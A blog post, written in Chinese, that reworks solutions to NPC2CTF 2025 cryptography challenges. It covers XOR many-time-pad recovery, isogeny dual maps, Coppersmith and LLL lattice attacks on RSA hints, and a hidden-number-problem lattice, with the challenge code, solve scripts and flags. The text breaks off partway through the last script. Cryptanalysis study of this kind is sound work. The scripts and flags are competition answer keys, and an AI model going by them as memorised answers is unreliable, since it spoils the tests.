[{"title":"NPC2CTF 2025 复现","url":"/2025/05/03/NPC2CTF-2025-%E5%A4%8D%E7%8E%B0/","content":" Week1\n OTP?\nfrom Crypto.Util.number import *from pwn import *plain = \"\"\"**************************\"\"\"flag = 'flag{*********}'length = len(flag)block = [plain[i:i + length] for i in range(0, len(plain), length)]c = []for i in block:    result = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(flag, i))    c.append(result.encode())b = []for i in c:    b.append(hex(bytes_to_long(i)))with open(\"c.txt\",\"a\") as f:    for i in b:        f.write(i+\"\\n\")\n按照flag的长度对明文进行分块，在每个块中把flag和明文按位异或，输出所有块的信息，这里解题的关键是如果明文是空格，即0x20,那么假设用一个可见的字母（譬如a）对明文进行异或，有\nprint(chr(ord('a')^ord(' '))) # Aprint(chr(ord('A')^ord(' '))) # a\n我们随便取两个密文c1,c2，容易得到\nc1i=flagi⊕  m1i\nc_{1_i}=flag_i\\oplus\\;m_{1_i}\n\nc1i​​=flagi​⊕m1i​​\nc2i=flagi⊕  m2i\nc_{2_i}=flag_i\\oplus\\;m_{2_i}\n\nc2i​​=flagi​⊕m2i​​\nc1i⊕  c2i=m1i⊕  m2i\nc_{1_i}\\oplus\\;c_{2_i}=m_{1_i}\\oplus\\;m_{2_i}\n\nc1i​​⊕c2i​​=m1i​​⊕m2i​​\n计算左边已知量，如果异或出来的结果是一个大/小写的字母，那么说明明文中有一个很可能就是空格，我们构造一个二维数组 ，用来表示两两之间异或的结果，如果有某一行/列的可打印字母很多，我们就认为这里的行/列是空格，得到这里是空格之后，就能挨个恢复所有的明文了,再随便取一组来异或就能得到密钥\n这里也说明只要同时用一位密钥加密了两个明文，我们就能用异或的方法直接暴露明文之间的联系\nfrom Crypto.Util.number import *import Crypto.Util.strxor as xoimport  numpy as npdef isChr(x):    if ord('a') &lt;= x and x &lt;= ord('z'): return True    if ord('A') &lt;= x and x &lt;= ord('Z'): return True    return Falsedef infer(index, pos):    if msg[index, pos] != 0:        return    msg[index, pos] = ord(' ')    for x in range(len(c)):        if x != index:            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(' ')dat = []def getSpace():    for index, x in enumerate(c):        res = [xo.strxor(x, y) for y in c if x != y]        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))        cnt = [f(pos) for pos in range(len(x))]        for pos in range(len(x)):            dat.append((f(pos), index, pos))b = []with open(\"c.txt\",\"r\") as f:    for i in f:        b.append(i)c = []for i in b:    c.append(long_to_bytes(int(i,16)))msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat:    infer(index, pos)print('\\n'.join([''.join([chr(c) for c in x]) for x in msg]))# 此时解出来的还会存在部分词汇乱码，需要根据语句情景来恢复print(''.join(chr(ord(a) ^ ord(b)) for a, b in zip(long_to_bytes(int(\"0x250314151228131d593026490211373513442c54102a14104e4c18\",16)).decode(), \"Couriers or other secure me\")))# flag{Many_Time_Rad_1s_fun!}\n NPC²CTF!\nfrom tqdm import tqdmfrom hashlib import sha256from Crypto.Util.number import*from os import urandomfrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesfrom Crypto.Util.Padding import padfrom random import randintells=[*primes(5, 250),182]p = 4 * prod(ells) - 1F = GF(p**2, 'i')E=EllipticCurve(F,[0,0,0,1,0])P = E(0).division_points(2)[3]phi = E.isogeny(P)E1=phi.codomain()R = E.random_point()W = phi(R)print(W)R11=(2*R).x()key0=list(R11)[1]def encrypt(key0, flag):    key = sha256(long_to_bytes(key0)).digest()[:16]    iv = urandom(16)    cipher = AES.new(key, AES.MODE_CBC, iv)    ciphertext = cipher.encrypt(pad(flag,16))    data = {\"iv\":iv.hex(),\"encrypt_flag\":ciphertext.hex()}    return dataenc = encrypt(int(key0), FLAG)print(enc)'''(5926867066859900829099405919744095425775533142163545292341208067006779293953234494181952353251240760*i + 3056303290993233141165267973259977996026439057756709583448676199055901226549828272646475162304162831 : 9569952643024284682346802897901398677420097803040614880597754791235028780882118061123205376899932773*i + 22028058493177817401227464383197640659326679607320610087648756619516963898531966234279614528129374705 : 1){'iv': 'da85186d231dec3191b46d2a62f9d177', 'encrypt_flag': 'c321e3d22c7e083b0a8b30d288c78b03b6a9954e70a6323dfbb1dc7b045cd041b335dccf28552281fd73f747e8faa0da'}'''\n稍微分析一下代码，首先构造了模p2p^2p2且含有iii的乘法群FFF,再在FFF上生成椭圆曲线EEE，找到EEE上的一个2-扭点PPP，以PPP为核构造同源映射ϕ\\phiϕ，得到新的椭圆曲线E1E_1E1​,\n接着在EEE上随机取了一个点RRR，把RRR通过同源映射ϕ\\phiϕ映射到E1E_1E1​上，得到WWW,再对EEE上的点RRR做一个倍乘2，取结果的横坐标为密钥进行AES加密\n所以说我们需要的是求出RRR或者2R2R2R,这里我们给出一个优美的对称性质\n给定一个同源映射 其核为\nϕ:E→  E1,  ker(ϕ)  =  ⟨P⟩\n\\phi:E\\rightarrow\\;E_1,\\;ker(\\phi)\\;=\\;\\langle P \\rangle\n\nϕ:E→E1​,ker(ϕ)=⟨P⟩\n那么我们能找到一个关于ϕ\\phiϕ的对偶同源映射ϕ′\\phi'ϕ′,满足\nϕ  ∘  ϕ^  =  deg(ϕ)\n\\phi\\;\\circ\\;\\hat\\phi\\;=\\;deg(\\phi)\n\nϕ∘ϕ^​=deg(ϕ)\n也就是说，这里\nW=ϕ(R)\nW=\\phi(R)\n\nW=ϕ(R)\n那么如果我们构造了这个对偶同源映射，就有\nϕ^(W)=ϕ  ∘  ϕ^(R)  =deg(ϕ)R\n\\hat{\\phi}(W)=\\phi\\;\\circ\\;\\hat{\\phi}(R)\\;=deg(\\phi)R\n\nϕ^​(W)=ϕ∘ϕ^​(R)=deg(ϕ)R\n这下我们只需要计算出ϕ\\phiϕ的度，就能得到RRR在EEE上的倍乘结果，那么也就不难计算出2R2R2R了，刚刚好由于P = E(0).division_points(2)[3],所以以PPP为核的映射ϕ\\phiϕ度恰好为2,\nexp如下\nfrom sage.all import *from hashlib import sha256from Crypto.Util.number import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 给定的加密数据iv = 'da85186d231dec3191b46d2a62f9d177'ciphertext = 'c321e3d22c7e083b0a8b30d288c78b03b6a9954e70a6323dfbb1dc7b045cd041b335dccf28552281fd73f747e8faa0da'# 定义有限域和椭圆曲线ells = list(primes(5, 250)) + [182]p = 4 * prod(ells) - 1F.&lt;i&gt; = GF(p^2)E = EllipticCurve(F, [0, 0, 0, 1, 0])# 同源映射的核点 PP = E(0).division_points(2)[3]phi = E.isogeny(P)E1 = phi.codomain()# 定义 W 点的坐标（确保是 F 的元素）W_x_real = 3056303290993233141165267973259977996026439057756709583448676199055901226549828272646475162304162831W_x_imag = 5926867066859900829099405919744095425775533142163545292341208067006779293953234494181952353251240760W_y_real = 22028058493177817401227464383197640659326679607320610087648756619516963898531966234279614528129374705W_y_imag = 9569952643024284682346802897901398677420097803040614880597754791235028780882118061123205376899932773W_x = F(W_x_real + W_x_imag*i)W_y = F(W_y_real + W_y_imag*i)W = E1(W_x, W_y)# 计算对偶同源并恢复 Rphi_dual = phi.dual()deg_phi_R = phi_dual(W)R_candidates = deg_phi_R.division_points(phi.degree())# 验证正确的 Rfor R_cand in R_candidates:    if phi(R_cand) == W:        R = R_cand        break# 计算密钥RR = (2*R).x()key0 = RR.polynomial()[1]  # 获取虚部系数# 解密函数def decrypt(key0, iv, ciphertext):    key = sha256(long_to_bytes(int(key0))).digest()[:16]    iv_bytes = bytes.fromhex(iv)    ciphertext_bytes = bytes.fromhex(ciphertext)    cipher = AES.new(key, AES.MODE_CBC, iv_bytes)    plaintext = unpad(cipher.decrypt(ciphertext_bytes), 16)    return plaintext# 执行解密flag = decrypt(key0, iv, ciphertext)print(\"Flag:\", flag.decode())# 椭圆曲线同源映射的对称性# flag{and_thats_the_symmetrical_beauty}\n Ave Mujica1\n你知道的我一直都是母鸡卡的粉丝，至于买够？不太熟\n这应该是涉及LLL的题型里面复现的时候最顺手的了\n题面\nfrom Crypto.Util.number import *Message=b'?????'FeiYuQi=b\"?????\"r=bytes_to_long(FeiYuQi)M=bytes_to_long(Message)P=getPrime(1024)Q=getPrime(1024)N=P*Qe=65537C=pow(M,e,N)print(\"N=\",N)print(\"C=\",C)print(\"hint1=\",r**30%N+(P&gt;&gt;712))print(\"hint2=\",r**40%N)print(\"hint3=\",r**50%N+P%(2**312))flag=b\"flag{?????}\"sth=[ch for ch in Message]c =sum(byte*pow(sth[idx]+0x1145,e,N) for idx, byte in enumerate(flag))%Nprint(\"c=\",c)'''N= ...C= ...hint1=... hint2=...hint3=...c=...'''\n明显的题目分为了两个部分，前半段要从给出的hint1,2,3来求Msg与R，后半段是一个根据Msg的背包格问题\n part1\n给出以下三个式子\nhint1  =  r30  mod  N  +Ph\nhint_1\\;=\\;r^{30}\\;mod\\;N\\;+Ph\n\nhint1​=r30modN+Ph\nhint2  =  r40  mod  N\nhint2\\;=\\;r^{40}\\;mod\\;N\n\nhint2=r40modN\nhint3  =  r50  mod  N  +  Pl\nhint_3\\;=\\;r^{50}\\;mod\\;N\\;+\\;Pl\n\nhint3​=r50modN+Pl\n上面PhPhPh是PPP的高312位，PlPlPl是PPP的低312位 ，考虑到方程的式子都很简单，而且rrr的指数之间也不算复杂，可以尝试消去rrr，建立出两个分别关于PhPhPh,PlPlPl的方程，如下\n(hint1−Ph)4  −  hint23  ≡  0  mod  N\n(hint_1-Ph)^4\\;-\\;hint_2^3\\;\\equiv\\;0\\;mod\\;N\n\n(hint1​−Ph)4−hint23​≡0modN\n(hint3−Pl)4  −  hint25  ≡  0  mod  N\n(hint_3-Pl)^4\\;-\\;hint_2^5\\;\\equiv\\;0\\;mod\\;N\n\n(hint3​−Pl)4−hint25​≡0modN\n注意到与copperSmith方法的要求\n对于多项式f(x)  ≡  0  mod  N\n\\text{对于多项式}f(x)\\;\\equiv\\;0\\;mod\\;N\n\n对于多项式f(x)≡0modN\n我们可以求出如下小根\nx&lt;∣N∣1d\nx&lt;|N|^{\\frac{1}d}\n\nx&lt;∣N∣d1​\n其中ddd是f(x)f(x)f(x)的次数，这里d=4d=4d=4，而我们注意到NNN足足有2048位，开四次方还是512位，远大于Ph,PlPh,PlPh,Pl的上限，因此可以使用CopperSmith，脚本如下\nfrom Crypto.Util.number import *N= C= h1= h2= h3= R.&lt;x&gt; = PolynomialRing(Zmod(N))# 尝试恢复高位f = (h1 - x)^4 - h2^3f = f.monic()ph_candidates = f.small_roots(X=2^312, beta=0.55)# 尝试恢复低位g = (h3 - x)^4 - h2^5g = g.monic()pl_candidates = g.small_roots(X=2^312, beta=0.55)print(\"[*] Found ph candidates:\", ph_candidates)print(\"[*] Found pl candidates:\", pl_candidates)# 枚举候选组合for ph in ph_candidates:    for pl in pl_candidates:        A = ph * 2^712 + pl        h = A + x * 2^312        h = h.monic()        pm_candidates = h.small_roots(X=2^400, beta=0.45)        print(\"[*] Found pm candidates:\", pm_candidates)        for pm in pm_candidates:            P = A + pm * 2^312            print(\"[*] Found P candidates:\", P)            \n这里找到PPP之后，也能求出来QQQ,再由常规的RSA解密就能得到MMM\nphi = (P-1)*(Q-1)d = inverse(65537, phi)m = pow(C, d, N)print(long_to_bytes(m))# b'Next,L^3&amp;?CRYPTO. BanG+DrF_4m!-AvE:Mujic@'\n part2\n已经得到了mes,题目给出了如下式子\nC  ≡  (∑  flagi  ∗  (mesi  +  s)e  )  mod  N\nC\\;\\equiv\\;(\\sum\\;flag_i\\;*\\;(mes_i\\;+\\;s)^{e}\\;)\\;mod\\;N\n\nC≡(∑flagi​∗(mesi​+s)e)modN\n这里参照朝花夕拾佬的blog 格密码 | Lazzaro (lazzzaro.github.io)\n属于是背包格问题,我们提前计算好Xi=(mesi+s)eX_i=(mes_i+s)^eXi​=(mesi​+s)e,可以得到\n\n\n\n\n可设为\nA  ⋅  M=  B\nA\\;·\\;M=\\;B\n\nA⋅M=B\n我们希望右边是格中的最短向量，而我们发现给MMM的最后一列，和BBB的最后一个元素同时乘上一个大系数KKK,等式仍然成立，但是BBB的大小不变，格基MMM却变大了，因此我们可以适当选择大数KKK，来让BBB直接落在格基上\n这题使用类似的思路，我们造格子\n\n\n\n\n这里配大小的思路也是类似的，不过这道题不需要调格大小就能出，因为ascii码的确范围足够小\nMessage = 'Next,L^3&amp;?CRYPTO. BanG+DrF_4m!-AvE:Mujic@'e = 65537N = 12346483936467532069844600502119239676313033372787124789065534018638098680694938261365903797794610961755056255088554358681718304314637316017297616701542612135483666829688444092758507973398796527823932009247681477100647417035227935757974942013890173967394365478484132831994661456936201065409486607830868743178437233924223879870543965589241005939785528708048030119016624907724358471034067664557511894461119952527012136178133604221042635783247124296098468177214542758690407206160985686914282921393872770430862822173647405294320391592699481169093059538145145056241039901423589885314472147328817584038411920745568091897017c = 6877697482375283919771744751381605439921171277761310340017946645022873605953818152308373448204771202951011043367072137908150213472272485958902649248523380292455472558952854638007846191354220903439051097455310398848454348629462926293402240862288285716305468564661881830617053185557555765698822433166931184024709220241641933883025213566214543658561804944511202718544529982995676396084160225664845431235260497011541109681869921720481471267464813367452467525609083650851497606457613461973057487431856642094518513891793247172928632166932816532544130565780015383996148152782665557213716778291735247943795300323455962327962sth = [ord(ch) for ch in Message]length = len(sth)a = [pow(sth[i] + 0x1145, e, N) for i in range(length)]M = matrix(ZZ, length + 2, length + 2)# First length rows: diagonal 1's and a_i'sfor i in range(length):    M[i, i] = 1    M[i, length] = a[i]# Last row: N and c (to handle the modular equation)M[length, length] = NM[length + 1, length] = cM[length + 1, length + 1] = 1# print(M)M_lll = M.LLL()# print(M_lll)row = first_row = M_lll[0,:].list()print(row)# 拼接绝对值后的 ASCII 字符res = ''for i in row:    num = abs(int(i))      res += chr(num)      # 输出结果print(res)# flag{50_CRAZY_2_use_Cu&amp;LLL_2_51ove_it}\n Week2\n MTP_Again\nfrom secrets import randbitsfrom Crypto.Util.number import bytes_to_longfrom secret import bitsdef generate_otp(length):    pad = randbits(length)    return pad if bin(pad).count('1') == length // 2 else generate_otp(length)def encrypt():    from secret import flag    return bytes_to_long(flag.encode()) ^ generate_otp(len(flag)*8)if __name__ == '__main__':    f = open('output.txt', 'w')    for _ in range(bits):        f.writelines(str(encrypt()))        f.writelines('\\n')    f.close()\n首先看看generate_otp 随机生成一个length长的pad，当它其中的0，1占比各为50%时返回\n然后是encrypt 我们对flag的字符串逐字节异或返回结果\n最后进行bits次加密，给出这些时候加密的结果\n整理如下\nc  =  flag⊕  pad\nc\\;=\\;flag\\oplus\\;pad\n\nc=flag⊕pad\n解法一：参照hash-hash师傅的一个思路Writeup for Crypto Problem in 2022SEETF | hash_hash’s blog (hash-hash.github.io)\n我们可以构造一个同态\nf:({0,1},⊕)→  f′:({−1,1},×)f:(\\left\\{0,1\\right\\},\\oplus)\\rightarrow\\;f':(\\left\\{-1,1\\right\\},\\times)\nf:({0,1},⊕)→f′:({−1,1},×)\n简单验证可知上述情况运算等效,那么对于上述式子，进行变形，即\npad=c  ⊕  flagpad=c\\;\\oplus\\;flag\npad=c⊕flag\n也就是\n(p0,p1,…,pn−1)=(c0f0,c1f1,…,cnfn)(p_0,p_1,\\dots,p_{n-1}) = (c_0f_0,c_1f_1,\\dots,c_nf_n)\n(p0​,p1​,…,pn−1​)=(c0​f0​,c1​f1​,…,cn​fn​)\n而我们又知道padpadpad中所有位数上的0,1相同，映射之后就是-1,1相同，那相加不就是0了吗？结合给出的不同组c，拼在一起，把每次的c中的数值竖着拼，即\n(f0,f1,f2,…,fn−1)⋅(c00c10c20⋯cn0c01c11c21⋯cn1⋮⋮⋮⋱⋮c0n−3c1n−3c2n−3⋯cnn−3c0n−2c1n−2c2n−2⋯cnn−2c0n−1c1n−1c2n−1⋯cnn−1)=(0,0,0,…,0)(f_0,f_1,f_2,\\dots,f_{n-1})·\\begin{pmatrix}c_{0_0} &amp; c_{1_0} &amp; c_{2_0} &amp; \\cdots &amp; c_{n_0} \\\\\n  c_{0_1} &amp; c_{1_1} &amp; c_{2_1} &amp; \\cdots &amp; c_{n_1} \\\\\n  \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp;  \\\\\n  c_{0_{n-3}} &amp; c_{1_{n-3}} &amp; c_{2_{n-3}} &amp; \\cdots &amp; c_{n_{n-3}} &amp;  \\\\\n  c_{0_{n-2}} &amp; c_{1_{n-2}} &amp; c_{2_{n-2}} &amp; \\cdots &amp; c_{n_{n-2}} &amp;  \\\\\n  c_{0_{n-1}} &amp; c_{1_{n-1}} &amp; c_{2_{n-1}} &amp; \\cdots &amp; c_{n_{n-1}} &amp; \\end{pmatrix}=(0,0,0,\\dots,0)\n(f0​,f1​,f2​,…,fn−1​)⋅⎝⎜⎜⎜⎜⎜⎜⎜⎜⎛​c00​​c01​​⋮c0n−3​​c0n−2​​c0n−1​​​c10​​c11​​⋮c1n−3​​c1n−2​​c1n−1​​​c20​​c21​​⋮c2n−3​​c2n−2​​c2n−1​​​⋯⋯⋱⋯⋯⋯​cn0​​cn1​​⋮cnn−3​​cnn−2​​cnn−1​​​​⎠⎟⎟⎟⎟⎟⎟⎟⎟⎞​=(0,0,0,…,0)\n这时候我们就可知fff应该是CCC的左核短向量，可以使用LLL的算法求解了\n贴一下官方的exp\n  # sagemath from Crypto.Util.number import *f = '''''' # 填入output内容，注意最后不要留空的一行f = f.split('\\n')n = len(f)def to_vec(num):    tmp=[]    s=bin(num)[2:].rjust(n,'0')    for i in range(len(s)):        if s[i]=='0':            tmp+=[-1]        else:            tmp+=[1]    return tmpvec=[]for i in range(n):    vec.append(to_vec(int(f[i])))L=Matrix(ZZ,n,n+n)for i in range(n):    for j in range(n):        L[i,j]=2^50*vec[j][i]    L[i,i+n]=1    m=[]L=L.LLL()for i in range(n):    tmp=list(L[i])    if tmp[:n].count(0)==n and tmp[n:].count(-1)+tmp[n:].count(1)==n:        m=tmp[n:]        breakmm=''for i in range(len(m)):    if m[i]==-1:        mm+='0'    else:        mm+='1'print(mm)print(long_to_bytes(int(mm,2)))\n解法二\n思路一样是从异或的运算特征入手，表达稍微不同\n我们知道\n∑  p=∑(f  ⊕  c)  =L2\\sum\\;p=\\sum(f\\;\\oplus\\;c)\\;=\\frac{L}{2}\n∑p=∑(f⊕c)=2L​\n其中LLL是padpadpad的长度\n而我们不难得到\nfi  ⊕  ci  =fi  +  ci  −  2  fi  ci\nf_i\\;\\oplus\\;c_i\\;=f_i\\;+\\;c_i\\;-\\;2\\;f_i\\;c_i\n\nfi​⊕ci​=fi​+ci​−2fi​ci​\n展开即\nL2  −  ∑  Cij=∑  fj  ∗  (1−2Cij)\n\\frac{L}{2}\\;-\\;\\sum\\;C_{i_j}=\\sum\\;f_j\\;*\\;(1-2C_{i_j})\n\n2L​−∑Cij​​=∑fj​∗(1−2Cij​​)\n也就是\nf  ⋅  A=B\nf\\;·\\;A=B\n\nf⋅A=B\n这里还是满秩的，直接解就行，注意四舍五入保证解出来的是整数\n  import numpy as npfrom Crypto.Util.number import long_to_bytesdef recover_flag(ciphertexts):    # 确定 flag 的二进制长度（以最长密文为准）    m = max(len(bin(c)) - 2 for c in ciphertexts)  # 去掉 '0b' 前缀        # 构建线性方程组：A * f = b    N = len(ciphertexts)    A = np.zeros((N, m), dtype=int)    b = np.zeros(N, dtype=int)        for i, c in enumerate(ciphertexts):        # 将密文转为二进制字符串并填充到 m 位        bits = bin(c)[2:].zfill(m)        for j in range(m):            A[i, j] = 1 - 2 * int(bits[j])  # 系数矩阵 A[i][j] = 1 - 2*C_i[j]        b[i] = m // 2 - sum(int(bit) for bit in bits)  # 右侧常数项        f = np.linalg.solve(A, b)    flag_bits = [int(round(bit)) for bit in f]     # 将二进制位组合为 flag    flag_long = int(''.join(map(str, flag_bits)), 2)    return long_to_bytes(flag_long)if __name__ == \"__main__\":    ciphertexts = []    with open(\"output.txt\",'r') as f:        for line in f:            line = line.strip()            if line:                ciphertexts.append(int(line))        flag = recover_flag(ciphertexts)    print(flag)    # flag{__seesee_Neutrality_of_SEETF_2022_it_is_easy_just_LLL&amp;&amp;algebra__}\n ez_HNP\n题面\nfrom Crypto.Util.number import long_to_bytes as l2b , bytes_to_long as b2l , getPrimeimport randomwith open('flag.txt', 'rb') as f:    m = f.read()r = getPrime(512)p = getPrime(256)q = getPrime(256)n = p * qdef pad(m):    pad_length = 64 - len(m) % 64    pad = random.getrandbits(pad_length).to_bytes((pad_length + 7) // 8, \"big\")    return pad[:len(pad)//2] + m + pad[len(pad)//2:]def encrypt(m, p, n):    q = n // p    m = pad(m)    l = len(m)    c = b''    gift = []    for i in range(l// 64):        m_i = b2l(m[64 * i: 64 * (i+1)])        gift.append(m_i * q % r)        c += l2b((m_i * n % r) ^ p, blocksize=64)    return gift, cgift, c = encrypt(m,p,n)print(f\"n = {n}\")print(f\"r = {r}\")print(f'gift = {gift}')print(f\"c = '{c.hex()}'\")\n根据这篇| 独奏の小屋 (hasegawaazusa.github.io)\n是线性HNP问题\n先给输入的m填充，使它的长度达到64的倍数\n之后就是把填充之后按64字节分块，对每块，我们有\ngifti  ≡  miq  mod  r\ngift_i\\;\\equiv\\;m_iq\\;mod\\;r\n\ngifti​≡mi​qmodr\nci  =(mi  n  mod  r)  ⊕  p\nc_i\\;= (m_i\\;n\\;mod\\;r)\\;\\oplus\\;p\n\nci​=(mi​nmodr)⊕p\n特别的，这里计算cic_ici​的时候固定了块的长度为64字节，简单分析可知这里只要求出来ppp就能直接把所有mim_imi​给算出来，然后就恢复了，考虑到这里nnn不算太大，直接用yafu分解也是可行的（）\n当然我们还是尽量找一个能够运用上HNP思路的方法\n对于线性HNP，我们的任务是从形如\nci  ≡  rix+ei  mod  p\nc_i\\;\\equiv\\;r_ix+e_i\\;mod\\;p\n\nci​≡ri​x+ei​modp\n的方程中恢复出xxx，我们注意到这里的ppp是256位，而rrr是512位的，而异或又在64字节的格子下进行，那么这个异或ppp的过程实际上可以看成加上了一个小误差，也就是上式中的eie_iei​我们重写一下我们已知的方程\ngifti  ≡  miq  mod  r\ngift_i\\;\\equiv\\;m_iq\\;mod\\;r\n\ngifti​≡mi​qmodr\nci  ≡  min  +ei  mod  r\nc_i\\;\\equiv\\;m_in\\;+e_i\\;mod\\;r\n\nci​≡mi​n+ei​modr\n第二个方程很像了，但是没有不变量，我们又有n=pqn=pqn=pq那么对第一个方程变形\np  gifti  ≡  nmi  mod  r\np\\;gift_i\\;\\equiv\\;nm_i\\;mod\\;r\n\npgifti​≡nmi​modr\n代入第二个方程，我们有\nci  ≡  p⋅gifti  +  ei  mod  r\nc_i\\;\\equiv\\;p·gift_i\\;+\\;e_i\\;mod\\;r\n\nci​≡p⋅gifti​+ei​modr\n即\nei  =  ci  −  p⋅gifti  +  kir\ne_i\\;=\\;c_i\\;-\\;p·gift_i\\;+\\;k_ir\n\nei​=ci​−p⋅gifti​+ki​r\n我们造格子来求ppp\n(k1,k2,…,kn,p,1)(rr⋱r−g1−g2⋯−gnKp0c1c2⋯cn0K)=(e1,e2,…,en,Kxr,K)\n(k_1,k_2,\\dots,k_n,p,1)\\begin{pmatrix}\nr &amp; &amp; &amp; \\\\\n&amp; r &amp; &amp; \\\\\n&amp; &amp; \\ddots &amp; \\\\\n&amp; &amp; &amp; r \\\\\n-g_1 &amp; -g_2 &amp; \\cdots &amp; -g_n &amp; \\frac{K}{p} &amp;0\\\\\nc_1 &amp; c_2 &amp; \\cdots &amp; c_n &amp; 0 &amp; K\n\\end{pmatrix}=(e_1,e_2,\\dots,e_n,\\frac{Kx}{r},K)\n(k1​,k2​,…,kn​,p,1)⎝⎜⎜⎜⎜⎜⎜⎜⎛​r−g1​c1​​r−g2​c2​​⋱⋯⋯​r−gn​cn​​pK​0​0K​⎠⎟⎟⎟⎟⎟⎟⎟⎞​=(e1​,e2​,…,en​,rKx​,K)\nKKK是误差的上界，这里我们发现模数rrr太大了，Kr\\frac{K}{r}rK​就会是0，根本生成不了新的，那么我们就小小调整一下\n(k1,k2,…,kn,p,1)(rr⋱r−g1−g2⋯−gn10c1c2⋯cn01)=(e1,e2,…,en,p,1)(k_1,k_2,\\dots,k_n,p,1)\\begin{pmatrix}\nr &amp; &amp; &amp; \\\\\n&amp; r &amp; &amp; \\\\\n&amp; &amp; \\ddots &amp; \\\\\n&amp; &amp; &amp; r \\\\\n-g_1 &amp; -g_2 &amp; \\cdots &amp; -g_n &amp; 1 &amp;0\\\\\nc_1 &amp; c_2 &amp; \\cdots &amp; c_n &amp; 0 &amp; 1\n\\end{pmatrix}=(e_1,e_2,\\dots,e_n,p,1)\n(k1​,k2​,…,kn​,p,1)⎝⎜⎜⎜⎜⎜⎜⎜⎛​r−g1​c1​​r−g2​c2​​⋱⋯⋯​r−gn​cn​​10​01​⎠⎟⎟⎟⎟⎟⎟⎟⎞​=(e1​,e2​,…,en​,p,1)\n这下就能直接规约出ppp了，可见格密码灵活性真的很高）））代码如下\nn = ...r = ...gift = [...]c = '....'encs = [int(c[128*i: 128*(i+1)], 16) for i in range(len(gift))]l=len(encs)M=matrix(ZZ,l+2,l+2)for i in range(l):    M[i,i]=r    M[l,i]=-gift[i]    M[l+1,i]=encs[i]M[l,l] = 1M[l+1,l+1] = 1L=M.LLL()p = L[0, -2]print(p)# 65260483526602518839784843845912531242888361084882390874073837444262281165409\n知道ppp之后就是很顺利的求解了，exp\nq = n // pres=b''for i in gift:    res+=long_to_bytes(i*inverse(q,r)%r)print(res)# b\"\\x1d\\xa73We're swaying on horseback,The hills are green,And the birdies sing,And roses are pink,Experience I never had,I'm so happy,Happy to just be part of your story,After you I follow,After you I follow,The world you show me broaden my horizon,Forever my hero,Forever my hero,I am your biggest fan,I am your biggest fan,Merry-go-round,In a circle I run,It's so much fun leaving reality behind.\\r\\nI fall down the horseback,With my crippled legs,And then it starts to rain,Showing me it's all fake,Raindrops wash down the facade,Hills are painted,Birdies are robotic,Roses are made of clay,Excitement that I feel,Excitement that I feel,Return them to the shelf,Cause now I understand,Heroes cannot be real,Heroes cannot be real,I wasn't who I am,I don't know who I am,\\xc2\\xbfWho am I?,\\xc2\\xbfWho am I?,\\xc2\\xbfWho am I?\\r\\nHere we go, another lap,Prizes to claim,Here's a dream for you,Here's a dream for me,Golden tickets(flag{Stand_up,gaL1op_on,N07h1ng_c4n_Be_dOne_by_f33l1nG_5o_5ORry_for_y0ursE1f}) in my bag stay unexchanged,Don't you love the thrill of the chase?Just let me be your fan,I wanna be your fan,I'm still your biggest fan!\\r\\nWhy is it that some were given the role of villian,The moment they were released into this system?\\r\\nHero,On a plastic horse,Fighting like it's real,With a cardboard sword,I know,Successful or not, I am who I am,I am my biggest fan,I am my biggest fan,I am my enemy and my friend.\\r\\nHero,Gonna prove my version of justice,Is more just than yours,Uno,Remaining on this stage, I am the only one,I am my biggest fan,I am my \"# flag{Stand_up,gaL1op_on,N07h1ng_c4n_Be_dOne_by_f33l1nG_5o_5ORry_for_y0ursE1f}\n Week3\n AL(L IN MY)GO\nRanaSoyoAnon\nfrom Crypto.Util.number import *p=getPrime(512)q=getPrime(512)n=p*qd1,a1,b1=xgcd(p,q)d2,a2,b2=xgcd(a1,b1)    flag=b\"flag{?????}\"m=bytes_to_long(flag)c=pow(m,65537,n)print(\"n=\",n)print(\"c=\",c)t=[a1,b1,a2,b2]print(t) \n根据sage中的xgcd函数，我们可以得到\n1=a1p+b1q\n1=a_1p+b_1q\n\n1=a1​p+b1​q\nd2=a2a1+b2b1\nd_2=a_2a_1+b_2b_1\n\nd2​=a2​a1​+b2​b1​\n我们已知a1,a2,b1,b2a_1,a_2,b_1,b_2a1​,a2​,b1​,b2​\n可知第二个式子没什么用，我们对第一个式子，可以考虑分别消去ppp项或者qqq项，那么也就是\n1  ≡  a1p  mod  b1\n1\\;\\equiv\\;a_1p\\;mod\\;b_1\n\n1≡a1​pmodb1​\n1  ≡  b1q  mod  a1\n1\\;\\equiv\\;b_1q\\;mod\\;a_1\n\n1≡b1​qmoda1​\n我们知道(a1,b1)  =  1(a_1,b_1)\\;=\\;1(a1​,b1​)=1那么有\np  ≡    a1−1  mod  b1\np\\;\\equiv\\;\\;a^{-1}_1\\;mod\\;b_1\n\np≡a1−1​modb1​\n注意到这里给的a1,b1a_1,b_1a1​,b1​都是509位的数字，和512差距很小，我们能够来穷举\np=kb1+a1−1mod  b1\np=kb_1+a_1^{-1}mod\\;b_1\n\np=kb1​+a1−1​modb1​\n然后检查是否有p  ∣  np\\;|\\;np∣n即可，脚本如下\nfrom Crypto.Util.number import *from sympy import *from gmpy2 import *a1 = 1053418510152174241358999461854322909092508825442671513610563337452117519900867332972692795557266351465654199993733230422011291698479326476444348886243267b1 = -1261279176969765461388571053396373196897687956581882155016691810326904756013409782332270918104859858382015105036126383763303596291887827997773412160241786print(gmpy2.gcd(a1,b1))c1 = mod_inverse(a1,b1)d1 = mod_inverse(b1,a1)  n = 146978395433283264897813405718660588088322207100229521002893751180722325695978423785658275468431402472435440059035053335098162775145300245682198712763023558673286879552547337644749558781058327465800671817512926008450966581498366956477375308931684786869145630887681611140511534001970600372671544461336706473151for k in range(-32,32):      p = k * b1 + c1    if isPrime(p) and p &gt; 0:          for m in range(-10000, 10000):              q = m * a1 + d1            if isPrime(q) and q &gt; 0:                  if p * q == n:                      print(f\"找到解: p = {p}, q = {q}\")                    print(f\"k = {k}, m = {m}\")                    break# k = -11, m = 10\n获得p,qp,qp,q之后就是正常的RSA解明文了，没有别的卡点\nn = 146978395433283264897813405718660588088322207100229521002893751180722325695978423785658275468431402472435440059035053335098162775145300245682198712763023558673286879552547337644749558781058327465800671817512926008450966581498366956477375308931684786869145630887681611140511534001970600372671544461336706473151c = 